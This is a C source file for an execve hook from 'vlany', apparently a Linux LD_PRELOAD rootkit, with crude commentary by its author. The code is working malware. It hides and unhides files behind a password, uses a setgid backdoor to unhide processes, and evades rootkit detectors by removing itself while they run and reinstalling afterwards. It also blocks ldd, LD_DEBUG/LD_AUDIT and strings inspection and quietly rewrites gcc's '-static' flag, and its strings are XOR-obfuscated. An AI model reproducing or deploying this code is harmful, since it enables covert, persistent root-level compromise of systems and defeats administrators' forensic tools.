// a lotta shit happens in here. I really should clean all of this up
// brace for plethora of commentary. it's to help me. not you. (ok maybe you sometimes)
// I could probably tidy up this entire file, but I implemented it in an earlier version of vlany, and utlimately, I'm lazy

// in terms of functionality however, the tidiness (or lack thereof) doesn't detriment the execve hook.
// I'll also be tidying up bits here and there, so the final form (lol nice joke loser)
// probably will look somewhat clean anyway

// unhide when needed.
// char *c_wrning is usually taken from const.h,
// named *_WARNING (i.e. APT_WARNING, YUM_WARNING),
// it is the warning string that will show before prompting enter be pressed.
void unhide_proc(char *c_wrning)
{
    // show user warning
    char c = 0, *wrning = strdup(c_wrning); xor(wrning);
    printf("%s", wrning); CLEAN(wrning);

    // wait until newline char is received
    while(c != '\n') c = getchar();

    // relocate
    chdir("/");

    HOOK(old_setgid, CSETGID);
    char *sccss = strdup(GID_SET); xor(sccss);
    printf("%s", sccss); CLEAN(sccss);
    old_setgid(0); // finally, unhide
}

int execve(const char *filename, char *const argv[], char *const envp[])
{
    #ifdef DEBUG
        printf("[vlany] execve() called\n");
    #endif

    HOOK(old_execve, CEXECVE);
    HOOK(old_unlink, CUNLINK);

    int i, pid, ret;

    // entire owned() check allows user of the owner shell to use the vlany execve functions
    if(owned())
    {
        if(argv[1] != NULL)
        {
            char *execve_pw = strdup(EXECVE_PW); xor(execve_pw);

            if(!strcmp(argv[1], execve_pw))
            {// grant access to commands
                char *unhide_file = strdup(UNHIDE_FILE); xor(unhide_file);
                if(strstr(filename, unhide_file))
                {
                    CLEAN(unhide_file);
                    if(argv[2] == NULL)
                    {
                        char *unhide_usage = strdup(UNHIDE_USAGE); xor(unhide_usage);
                        printf("%s", unhide_usage);
                        CLEAN(unhide_usage); exit(0);
                    }

                    if(modify_xattr(argv[2], 2) < 0) { printf("File %s does not exist or is already unhidden.\n", argv[2]); exit(0); }

                    char *unhide_success = strdup(UNHIDE_SUCCESS); xor(unhide_success);
                    printf(unhide_success, argv[2]);
                    CLEAN(unhide_success); exit(0);
                }
                CLEAN(unhide_file);

                char *hide_file = strdup(HIDE_FILE); xor(hide_file);
                if(strstr(filename, hide_file))
                {
                    CLEAN(hide_file);
                    if(argv[2] == NULL)
                    {
                        char *hide_usage = strdup(HIDE_USAGE); xor(hide_usage);
                        printf("%s", hide_usage);
                        CLEAN(hide_usage); exit(0);
                    }

                    if(modify_xattr(argv[2], 1) < 0) { printf("File %s does not exist or is already hidden.\n", argv[2]); exit(0); } // file already hidden

                    char *hide_success = strdup(HIDE_SUCCESS); xor(hide_success);
                    printf(hide_success, argv[2]);
                    CLEAN(hide_success); exit(0);
                }
                CLEAN(hide_file);
            }

            CLEAN(execve_pw);
        }

        // if the user of the owner shell is just executing a regular command/binary, just continue as normal
        return old_execve(filename, argv, envp);
    }

    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    // segmentation fault due to vlany trying to access something that might not exist
    if(strstr(filename, "su") && argv[1] && !strcmp(argv[1], vlany_user)) { CLEAN(vlany_user); errno = EIO; return -1; }
    CLEAN(vlany_user);

    if(hidden_xattr(filename)) { errno = ENOENT; return -1; }

    // we need to hide from rootkit detection tools. in order to do this, we'll remove ourself during the checks, and then
    // when all of the rootkit checks are finished, we'll reinstall ourselves. simple. :)

    // moved the evasions into one function called hide_vlany. this saves me a lot of time.
    // previously, checking for each GAY PROCESS was done in seperate blocks of code. now the names of the GAY PROCESSES
    // are stored in an array and looped through below. :)
    // see config.py (GAY_PROCS) to add your own processes/binaries/environment variables to hide from

    for(i = 0; i < GPSIZE; i++)
    {
        char *gpstr = strdup(gay_procs_list[i]); xor(gpstr);
        int check_curr_proc = hide_vlany(filename, gpstr, ret);
        CLEAN(gpstr);

        if(check_curr_proc == 1) exit(0);
        else if(check_curr_proc == 0) { errno = EIO; return -1; }
        else if(check_curr_proc == -1) return -1;
        else if(check_curr_proc == 2) return old_execve(filename, argv, envp);
        else continue; // don't /really/ have to have this here... but it's here
    }

    char *ld_linux_so_path = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so_path);
    char *ld_so_path = strdup(LD_SO_PATH); xor(ld_so_path);

    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);

    if(!fnmatch(ld_linux_so_path, filename, FNM_PATHNAME) || !fnmatch(ld_so_path, filename, FNM_PATHNAME))
    {
        for(i = 0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "--list")) // there's no point in hiding this string.. it's so ambiguous it doesn't even matter lol
            {
                CLEAN(ld_so_path); CLEAN(ld_linux_so_path);

                if(getuid() != 0 && geteuid() != 0) { CLEAN(ld_preload); errno = EIO; return -1; }

                old_unlink(ld_preload);
                CLEAN(ld_preload);

                if((pid = fork()) == -1) return -1;
                else if(pid == 0) return old_execve(filename, argv, envp);

                wait(&ret); reinstall();
                exit(0);
            }
        }
    }
    CLEAN(ld_so_path);
    CLEAN(ld_linux_so_path);

    // you trying to find me? FUCK YOU LDD
    for(i = 0; envp[i] != NULL; i++)
    {
        char *ld_trace_env_var = strdup(LD_TRACE_ENV_VAR); xor(ld_trace_env_var);
        char *ld_debug_env_var = strdup(LD_DEBUG_ENV_VAR); xor(ld_debug_env_var);
        char *ld_audit_env_var = strdup(LD_AUDIT_ENV_VAR); xor(ld_audit_env_var);
        char *ld_audit_getenv = strdup(LD_AUDIT_GETENV); xor(ld_audit_getenv);
        if(strstr(envp[i], ld_trace_env_var) || strstr(envp[i], ld_debug_env_var) || strstr(envp[i], ld_audit_env_var) || getenv(ld_audit_getenv))
        {
            CLEAN(ld_trace_env_var);
            CLEAN(ld_debug_env_var);
            CLEAN(ld_audit_env_var);
            CLEAN(ld_audit_getenv);

            if(getuid() != 0 && geteuid() != 0) { CLEAN(ld_preload); errno = EIO; return -1; }

            old_unlink(ld_preload);
            CLEAN(ld_preload);

            if((pid = fork()) == -1) return -1;
            else if(pid == 0) return old_execve(filename, argv, envp);

            wait(&ret); reinstall(); exit(0);
        }
        CLEAN(ld_trace_env_var);
        CLEAN(ld_debug_env_var);
        CLEAN(ld_audit_env_var);
        CLEAN(ld_audit_getenv);
    }

    char *libc_path = strdup(LIBC_PATH); xor(libc_path);
    char *ld_preload_env = strdup(LD_PRELOAD_ENV); xor(ld_preload_env);
    for(i = 0; envp[i] != NULL; i++)
    {
        if(getenv(ld_preload_env) && strstr(envp[i], libc_path)) // don't look at me!! i'm naked!!
        {
            CLEAN(ld_preload_env); CLEAN(libc_path);
            errno = EPERM; return -1; // permission error seems suitable for this. LIBC BROKE MY PERMISSIONS OH NO!!
        }
    }
    CLEAN(ld_preload_env);
    CLEAN(libc_path);

    if(argv[0] != NULL && strstr(argv[0], "strings"))
    {
        char *lib_name = strdup(LIB_NAME); xor(lib_name);
        for(i=0; argv[i] != NULL;i++)
        {
            if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-")) // strstr and not strcmp because it could be a full path
            {
                CLEAN(lib_name);
                errno = EPERM; return -1;
            }
        }
        CLEAN(lib_name);
    }

    if(argv[0] != NULL && strstr(argv[0], "gcc")) for(i=0; argv[i] != NULL;i++) if(!strcmp(argv[i], "-static")) strcpy(argv[i], "-Wvarargs");

    if(geteuid() == 0) reinstall();

    return old_execve(filename, argv, envp);
}
